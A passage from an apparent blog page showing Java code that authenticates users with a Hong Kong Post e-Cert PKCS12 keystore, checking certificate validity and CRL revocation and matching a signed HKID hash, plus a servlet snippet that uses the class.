class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br></pre></td><td class="code"><pre><span class="line">package xx;</span><br><span class="line"></span><br><span class="line">import java.io.DataInputStream;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLConnection;</span><br><span class="line">import java.security.InvalidAlgorithmParameterException;</span><br><span class="line">import java.security.InvalidKeyException;</span><br><span class="line">import java.security.KeyStore;</span><br><span class="line">import java.security.KeyStoreException;</span><br><span class="line">import java.security.MessageDigest;</span><br><span class="line">import java.security.NoSuchAlgorithmException;</span><br><span class="line">import java.security.PrivateKey;</span><br><span class="line">import java.security.PrivilegedActionException;</span><br><span class="line">import java.security.Signature;</span><br><span class="line">import java.security.UnrecoverableKeyException;</span><br><span class="line">import java.security.cert.CertPath;</span><br><span class="line">import java.security.cert.CertPathValidator;</span><br><span class="line">import java.security.cert.CertPathValidatorException;</span><br><span class="line">import java.security.cert.CertStore;</span><br><span class="line">import java.security.cert.Certificate;</span><br><span class="line">import java.security.cert.CertificateEncodingException;</span><br><span class="line">import java.security.cert.CertificateException;</span><br><span class="line">import java.security.cert.CertificateExpiredException;</span><br><span class="line">import java.security.cert.CertificateFactory;</span><br><span class="line">import java.security.cert.CertificateNotYetValidException;</span><br><span class="line">import java.security.cert.CertificateParsingException;</span><br><span class="line">import java.security.cert.CollectionCertStoreParameters;</span><br><span class="line">import java.security.cert.PKIXCertPathValidatorResult;</span><br><span class="line">import java.security.cert.PKIXParameters;</span><br><span class="line">import java.security.cert.TrustAnchor;</span><br><span class="line">import java.security.cert.X509CRL;</span><br><span class="line">import java.security.cert.X509Certificate;</span><br><span class="line">import java.util.Collections;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.Iterator;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.ResourceBundle;</span><br><span class="line">import java.util.Set;</span><br><span class="line">import java.util.Vector;</span><br><span class="line">import com.ibm.security.util.ObjectIdentifier;</span><br><span class="line">import com.ibm.security.x509.Extension;</span><br><span class="line">import com.ibm.security.x509.X509CertImpl;</span><br><span class="line"></span><br><span class="line">public class Authenticator &#123;</span><br><span class="line">  private static final String start = &quot;-----BEGIN CERTIFICATE-----\n&quot;;</span><br><span class="line">  private static final String end = &quot;-----END CERTIFICATE-----&quot;;</span><br><span class="line"></span><br><span class="line">  private ResourceBundle m_configuration = ResourceBundle.getBundle(&quot;dh.properties.pkcs12&quot;);</span><br><span class="line">  private KeyStore m_keyStore = null;</span><br><span class="line">  private boolean keyStoreLoaded = false;</span><br><span class="line">  private String certificateID = &quot;&quot;;</span><br><span class="line">  private X509Certificate certificate;</span><br><span class="line">  private String password = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">  public KeyStore loadKeyStore(final InputStream inStream, final String password) throws KeyStoreException,</span><br><span class="line">          NoSuchAlgorithmException, CertificateException, IOException &#123;</span><br><span class="line">      String keyStoreType = m_configuration.getString(&quot;KEY_STORE_TYPE&quot;);</span><br><span class="line">      try &#123;</span><br><span class="line">          m_keyStore = KeyStore.getInstance(keyStoreType);</span><br><span class="line">      &#125; catch (KeyStoreException e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">          throw e;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      System.out.println(&quot;load the p12 file&quot;);</span><br><span class="line">      if (password != null) &#123;</span><br><span class="line">          this.password = password;</span><br><span class="line">          m_keyStore.load(inStream, password.toCharArray());</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">          m_keyStore.load(inStream, null);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      System.out.println(&quot;file is loaded successful&quot;);</span><br><span class="line">      keyStoreLoaded = true;</span><br><span class="line"></span><br><span class="line">      return m_keyStore;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public String getCertificateID() throws KeyStoreException &#123;</span><br><span class="line">      System.out.println(&quot;calling getCertificateID()&quot;); //$IGN_Avoid_standard_output_input_error$&lt;working as intended&gt; //$IGN_Remove_System_print_or_println_statements$&lt;working as intended&gt;</span><br><span class="line">      if (!keyStoreLoaded) &#123;</span><br><span class="line">          throw new KeyStoreException(&quot;Key store has not been loaded.&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      StringBuffer result = new StringBuffer();</span><br><span class="line"></span><br><span class="line">      try &#123;</span><br><span class="line">          Enumeration&lt;String&gt; aliases = m_keyStore.aliases();</span><br><span class="line">          while (aliases.hasMoreElements()) &#123;</span><br><span class="line">              String alias = aliases.nextElement();</span><br><span class="line">              if (m_keyStore.isKeyEntry(alias)) &#123;</span><br><span class="line">                  result.append(alias);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; catch (KeyStoreException e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">          throw e;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      return result.toString();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public String getEncocdedCertificate() throws KeyStoreException &#123;</span><br><span class="line">      System.out.println(&quot;calling getCertificate()&quot;); //$IGN_Avoid_standard_output_input_error$&lt;working as intended&gt; //$IGN_Remove_System_print_or_println_statements$&lt;working as intended&gt;</span><br><span class="line"></span><br><span class="line">      if (!keyStoreLoaded) &#123;</span><br><span class="line">          throw new KeyStoreException(&quot;Key store has not been loaded.&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      try &#123;</span><br><span class="line">          certificate = retrieveCertificate();</span><br><span class="line">      &#125; catch (Exception e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">          return &quot;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      try &#123;</span><br><span class="line">          return start + new String(BASE64Coder.encode(certificate.getEncoded())) + &quot;\n&quot; + end;</span><br><span class="line">      &#125; catch (CertificateEncodingException e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">      return &quot;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private X509Certificate retrieveCertificate() throws KeyStoreException, CertificateExpiredException,</span><br><span class="line">          CertificateNotYetValidException &#123;</span><br><span class="line">      if (!keyStoreLoaded) &#123;</span><br><span class="line">          throw new KeyStoreException(&quot;Key store has not been loaded.&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      Certificate cert = m_keyStore.getCertificate(certificateID);</span><br><span class="line"></span><br><span class="line">      if (cert == null) &#123;</span><br><span class="line">          //System.out.println(&quot;Searching for all aliases&quot;);</span><br><span class="line">          Enumeration&lt;String&gt; aliases = m_keyStore.aliases();</span><br><span class="line"></span><br><span class="line">          while (aliases.hasMoreElements()) &#123;</span><br><span class="line">              String alias = aliases.nextElement().trim();</span><br><span class="line"></span><br><span class="line">              if (m_keyStore.isKeyEntry(alias)) &#123;</span><br><span class="line">                  cert = m_keyStore.getCertificate(alias);</span><br><span class="line"></span><br><span class="line">                  if (cert == null) &#123;</span><br><span class="line">                      continue;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (cert instanceof X509Certificate) &#123;</span><br><span class="line">          certificate = (X509Certificate) cert;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      try &#123; //$IGN_Place_try_catch_out_of_loop$&lt;working as intended&gt;</span><br><span class="line">          certificate.checkValidity();</span><br><span class="line">      &#125; catch (CertificateExpiredException e) &#123;</span><br><span class="line">          System.out.println(e);</span><br><span class="line">          throw e;</span><br><span class="line">      &#125; catch (CertificateNotYetValidException e) &#123;</span><br><span class="line">          System.out.println(e);</span><br><span class="line">          throw e;</span><br><span class="line">      &#125; //$IGN_Always_use_caught_exception$&lt;working as intended&gt;</span><br><span class="line"></span><br><span class="line">      return certificate;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public String getSubjectDN() throws CertificateExpiredException, CertificateNotYetValidException, KeyStoreException &#123;</span><br><span class="line">      certificate = retrieveCertificate();</span><br><span class="line">      try &#123;</span><br><span class="line">          String principal = certificate.getSubjectX500Principal().getName();</span><br><span class="line">          return principal;</span><br><span class="line">      &#125; catch (Exception e) &#123;</span><br><span class="line">          String subjectDNName = certificate.getSubjectDN().getName();</span><br><span class="line">          return subjectDNName;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void checkCRL() throws CertPathValidatorException &#123;</span><br><span class="line">      System.out.println(&quot;calling checkCRL&quot;);</span><br><span class="line">      if (certificate == null) &#123;</span><br><span class="line">          try &#123;</span><br><span class="line">              certificate = retrieveCertificate();</span><br><span class="line">          &#125; catch (Exception e) &#123;</span><br><span class="line">              e.printStackTrace();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      CertPath cp = null;</span><br><span class="line">      Vector&lt;Certificate&gt; certs = new Vector&lt;Certificate&gt;();</span><br><span class="line"></span><br><span class="line">      // load the cert to be checked</span><br><span class="line">      certs.add(certificate);</span><br><span class="line"></span><br><span class="line">      // handle location of CRL</span><br><span class="line">      //System.out.println(&quot;Using the CRL specified in the &quot; + &quot;cert to check the revocation status of: &quot;</span><br><span class="line">      //  + certs.elementAt(0));</span><br><span class="line">      System.setProperty(&quot;com.sun.security.enableCRLDP&quot;, &quot;true&quot;);</span><br><span class="line"></span><br><span class="line">      CertificateFactory cf = null;</span><br><span class="line">      // init cert path</span><br><span class="line">      PKIXParameters params = null;</span><br><span class="line">      try &#123;</span><br><span class="line">          cf = CertificateFactory.getInstance(&quot;X509&quot;);</span><br><span class="line">          cp = (CertPath) cf.generateCertPath(certs);</span><br><span class="line"></span><br><span class="line">          // load the root CA cert</span><br><span class="line">          String rootCaCert = m_configuration.getString(&quot;ROOT_CA_CERT&quot;);</span><br><span class="line">          X509Certificate rootCACert = getCertFromFile(rootCaCert);</span><br><span class="line">          System.out.println(&quot;rootCACert = &quot; + rootCACert);</span><br><span class="line"></span><br><span class="line">          // init trusted certs</span><br><span class="line">          TrustAnchor ta = new TrustAnchor(rootCACert, null);</span><br><span class="line">          Set&lt;TrustAnchor&gt; trustedCerts = new HashSet&lt;TrustAnchor&gt;();</span><br><span class="line">          trustedCerts.add(ta);</span><br><span class="line"></span><br><span class="line">          // init PKIX parameters</span><br><span class="line">          params = new PKIXParameters(trustedCerts);</span><br><span class="line">      &#125; catch (CertificateException e) &#123;</span><br><span class="line">          System.out.println(e);</span><br><span class="line">          return;</span><br><span class="line">      &#125; catch (Exception e) &#123;</span><br><span class="line">          System.out.println(e);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      URL url = null;</span><br><span class="line">      X509CertImpl certificateImpl = (X509CertImpl) certificate;</span><br><span class="line"></span><br><span class="line">      Set&lt;String&gt; oids = certificateImpl.getNonCriticalExtensionOIDs();</span><br><span class="line">      for (String key : oids) &#123;</span><br><span class="line">          System.out.println(&quot;key = &quot; + key);</span><br><span class="line">          try &#123;</span><br><span class="line">              Extension e = certificateImpl.getExtension(new ObjectIdentifier(key));</span><br><span class="line">              String val = e.toString();</span><br><span class="line">              if (val.indexOf(&quot;CRLDistributionPoints&quot;) != -1) &#123;</span><br><span class="line">                  int start = val.indexOf(&quot;http&quot;);</span><br><span class="line">                  int end = val.indexOf(&quot;.crl&quot;);</span><br><span class="line">                  url = new URL(val.substring(start, end + 4));</span><br><span class="line">              &#125;</span><br><span class="line">          &#125; catch (Exception ex) &#123;</span><br><span class="line">              System.out.println(ex);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // load the CRL</span><br><span class="line">      try &#123;</span><br><span class="line">          if (url != null) &#123;</span><br><span class="line">              URLConnection connection = url.openConnection();</span><br><span class="line">              connection.setDoInput(true);</span><br><span class="line">              connection.setUseCaches(false);</span><br><span class="line">              DataInputStream inStream = new DataInputStream(connection.getInputStream());</span><br><span class="line">              X509CRL crl = (X509CRL) cf.generateCRL(inStream);</span><br><span class="line">              inStream.close();</span><br><span class="line"></span><br><span class="line">              params.addCertStore(CertStore.getInstance(&quot;Collection&quot;, new CollectionCertStoreParameters(Collections</span><br><span class="line">                      .singletonList(crl))));</span><br><span class="line">              params.setRevocationEnabled(true);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; catch (Exception e) &#123;</span><br><span class="line">          System.out.println(&quot;fail to load url &quot; + url);</span><br><span class="line">          System.out.println(e);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // perform validation</span><br><span class="line">      try &#123;</span><br><span class="line">          CertPathValidator cpv = CertPathValidator.getInstance(&quot;PKIX&quot;);</span><br><span class="line"></span><br><span class="line">          PKIXCertPathValidatorResult cpv_result = (PKIXCertPathValidatorResult) cpv.validate(cp, params);</span><br><span class="line">          X509Certificate trustedCert = (X509Certificate) cpv_result.getTrustAnchor().getTrustedCert();</span><br><span class="line">          if (trustedCert == null) &#123;</span><br><span class="line">              System.out.println(&quot;Trusted Cert = NULL&quot;);</span><br><span class="line">          &#125; else &#123;</span><br><span class="line">              System.out.println(&quot;Trusted CA DN = &quot; + trustedCert.getSubjectDN());</span><br><span class="line">          &#125;</span><br><span class="line">          System.out.println(&quot;CERTIFICATE VALIDATION SUCCEEDED&quot;);</span><br><span class="line">      &#125; catch (NoSuchAlgorithmException e) &#123;</span><br><span class="line">          System.out.println(e);</span><br><span class="line">      &#125; catch (CertPathValidatorException e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">          throw e;</span><br><span class="line">      &#125; catch (InvalidAlgorithmParameterException e) &#123;</span><br><span class="line">          System.out.println(e);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private static X509Certificate getCertFromFile(String path) &#123;</span><br><span class="line">      X509Certificate cert = null;</span><br><span class="line">      try &#123;</span><br><span class="line">          File certFile = new File(path);</span><br><span class="line">          if (!certFile.canRead())</span><br><span class="line">              throw new IOException(&quot; File &quot; + certFile.toString() + &quot; is unreadable&quot;);</span><br><span class="line"></span><br><span class="line">          FileInputStream fis = new FileInputStream(path);</span><br><span class="line">          CertificateFactory cf = CertificateFactory.getInstance(&quot;X509&quot;);</span><br><span class="line">          cert = (X509Certificate) cf.generateCertificate(fis);</span><br><span class="line"></span><br><span class="line">      &#125; catch (Exception e) &#123;</span><br><span class="line">          System.out.println(&quot;Can&#x27;t construct X509 Certificate. &quot; + e.getMessage());</span><br><span class="line">      &#125;</span><br><span class="line">      return cert;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * GeneralName ::= CHOICE &#123;</span><br><span class="line">   *     otherName                       [0]     OtherName,</span><br><span class="line">   *     rfc822Name                      [1]     IA5String,</span><br><span class="line">   *     dNSName                         [2]     IA5String,</span><br><span class="line">   *     x400Address                     [3]     ORAddress,</span><br><span class="line">   *     directoryName                   [4]     Name,</span><br><span class="line">   *     ediPartyName                    [5]     EDIPartyName,</span><br><span class="line">   *     uniformResourceIdentifier       [6]     IA5String,</span><br><span class="line">   *     iPAddress                       [7]     OCTET STRING,</span><br><span class="line">   *     registeredID                    [8]     OBJECT IDENTIFIER&#125;</span><br><span class="line">   * @see java.security.cert.X509Certificate#getSubjectAlternativeNames()</span><br><span class="line">   * @link http://www.ietf.org/rfc/rfc2459.txt</span><br><span class="line">   */</span><br><span class="line">  private String getDomainName() &#123;</span><br><span class="line">      String domainName = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">      try &#123;</span><br><span class="line">          Iterator it = certificate.getSubjectAlternativeNames().iterator();</span><br><span class="line">          while (it.hasNext()) &#123;</span><br><span class="line">              List list = (List) it.next();</span><br><span class="line">              if (((Integer) list.get(0)).intValue() == 2) &#123;</span><br><span class="line">                  domainName = list.get(1).toString();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">      &#125; catch (CertificateParsingException e) &#123;</span><br><span class="line">          // TODO Auto-generated catch block</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      return domainName;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private String encodeID(String hkid) &#123;</span><br><span class="line">      Signature signature = null;</span><br><span class="line">      PrivateKey key = null;</span><br><span class="line">      String hashAlgorithm = &quot;SHA-1&quot;;</span><br><span class="line">      try &#123;</span><br><span class="line">          key = (PrivateKey) m_keyStore.getKey(getCertificateID(), this.password.toCharArray());</span><br><span class="line">          String signingAlgorithm = &quot;SHA1with&quot; + key.getAlgorithm();</span><br><span class="line">          signature = Signature.getInstance(signingAlgorithm);</span><br><span class="line">      &#125; catch (UnrecoverableKeyException e) &#123;</span><br><span class="line">          System.out.println(&quot;UnrecoverableKeyException &quot; + e);</span><br><span class="line">      &#125; catch (KeyStoreException e) &#123;</span><br><span class="line">          System.out.println(&quot;KeyStoreException &quot; + e);</span><br><span class="line">      &#125; catch (NoSuchAlgorithmException e) &#123;</span><br><span class="line">          System.out.println(&quot;NoSuchAlgorithmException &quot; + e);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      try &#123;</span><br><span class="line">          signature.initSign(key);</span><br><span class="line">          signature.update(hkid.getBytes(&quot;UTF-8&quot;));</span><br><span class="line"></span><br><span class="line">          byte[] signed = signature.sign();</span><br><span class="line">          MessageDigest digest = null;</span><br><span class="line">          digest = MessageDigest.getInstance(hashAlgorithm);</span><br><span class="line">          //System.out.println(&quot;Got MD algorithm&quot;);</span><br><span class="line">          String encodedID = new String(BASE64Coder.encode(digest.digest(signed)));</span><br><span class="line">          System.out.println(&quot;Done hashing&quot;);</span><br><span class="line">          return encodedID;</span><br><span class="line">          //signature.initVerify(certificate.getPublicKey());</span><br><span class="line">          /*if (signature.verify(signed)) &#123;</span><br><span class="line"></span><br><span class="line">          &#125;*/</span><br><span class="line">      &#125; catch (Exception ignore) &#123;</span><br><span class="line">          System.out.println(&quot;Exception &quot; + ignore);</span><br><span class="line">      &#125;</span><br><span class="line">      return &quot;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public boolean checkHKID(String hkid) &#123;</span><br><span class="line">      System.out.println(&quot;check HKID&quot;);</span><br><span class="line">      String domainName = getDomainName();</span><br><span class="line">      String encodedID = encodeID(hkid);</span><br><span class="line"></span><br><span class="line">      System.out.println(&quot;domainName = &quot; + domainName);</span><br><span class="line">      System.out.println(&quot;encodedID = &quot; + encodedID);</span><br><span class="line"></span><br><span class="line">      if (encodedID.length() != domainName.length())</span><br><span class="line">          return false;</span><br><span class="line"></span><br><span class="line">      for (int i = 0; i &lt; encodedID.length(); i++)</span><br><span class="line">          if (encodedID.charAt(i) != domainName.charAt(i))</span><br><span class="line">              return false;</span><br><span class="line"></span><br><span class="line">      return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>— Class 2 —<br>Using it</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Authenticator auth = new Authenticator();</span><br><span class="line">      try &#123;</span><br><span class="line">          auth.loadKeyStore(in, certPin);</span><br><span class="line">      &#125; catch (KeyStoreException e) &#123;</span><br><span class="line">          System.out.println(&quot;KeyStoreException error = &quot; + e.getMessage());</span><br><span class="line">          errMsg = bundle.getString(ErrMsgConfig.ECERT00007);</span><br><span class="line">      &#125; catch (NoSuchAlgorithmException e) &#123;</span><br><span class="line">          System.out.println(&quot;NoSuchAlgorithmException error = &quot; + e.getMessage());</span><br><span class="line">          errMsg = bundle.getString(ErrMsgConfig.ECERT00019);</span><br><span class="line">      &#125; catch (CertificateException e) &#123;</span><br><span class="line">          System.out.println(&quot;CertificateException error = &quot; + e.getMessage());</span><br><span class="line">          errMsg = bundle.getString(ErrMsgConfig.ECERT00007);</span><br><span class="line">      &#125; catch (IOException e) &#123;</span><br><span class="line">          System.out.println(&quot;IOException error = &quot; + e.getMessage());</span><br><span class="line">          errMsg = bundle.getString(ErrMsgConfig.ECERT00019);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      String subjectDN = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">      if (errMsg.length() == 0) &#123;</span><br><span class="line">          try &#123;</span><br><span class="line">              subjectDN = auth.getSubjectDN();</span><br><span class="line">          &#125; catch (CertificateExpiredException e) &#123;</span><br><span class="line">              System.out.println(&quot;CertificateExpiredException error = &quot; + e.getMessage());</span><br><span class="line">              errMsg = bundle.getString(ErrMsgConfig.ECERT00002);</span><br><span class="line">          &#125; catch (CertificateNotYetValidException e) &#123;</span><br><span class="line">              System.out.println(&quot;CertificateNotYetValidException error = &quot; + e.getMessage());</span><br><span class="line">              errMsg = bundle.getString(ErrMsgConfig.ECERT00003);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      System.out.println(&quot;subject: &quot; + subjectDN);</span><br><span class="line">      if (errMsg.length() == 0) &#123;</span><br><span class="line">          try &#123;</span><br><span class="line">              boolean valid = RmiSignVerifier.checkCRL(auth.getEncocdedCertificate());</span><br><span class="line">              if (!valid) &#123;</span><br><span class="line">                  errMsg = bundle.getString(ErrMsgConfig.ECERT00014);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125; catch (CertPathValidatorException e) &#123;</span><br><span class="line">              System.out.println(&quot;CertPathValidatorException error = &quot; + e.getMessage());</span><br><span class="line">              errMsg = bundle.getString(ErrMsgConfig.ECERT00004);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (errMsg.length() == 0) &#123;</span><br><span class="line">          req.setAttribute(&quot;errMsg&quot;, errMsg);</span><br><span class="line"></span><br><span class="line">          List&lt;Rdn&gt; names = new LdapName(subjectDN).getRdns();</span><br><span class="line">          for (Rdn name : names) &#123;</span><br><span class="line">              System.out.println(&quot;rdn &quot; + name.getType() + &quot;, &quot; + name.getValue());</span><br><span class="line">              String value = name.getValue().toString();</span><br><span class="line"></span><br><span class="line">              if (name.getType().equals(&quot;O&quot;)) &#123;</span><br><span class="line">                  if (value.indexOf(&quot;Hongkong Post&quot;) == -1) &#123;</span><br><span class="line">                      errMsg = bundle.getString(ErrMsgConfig.ECERT00007);</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span 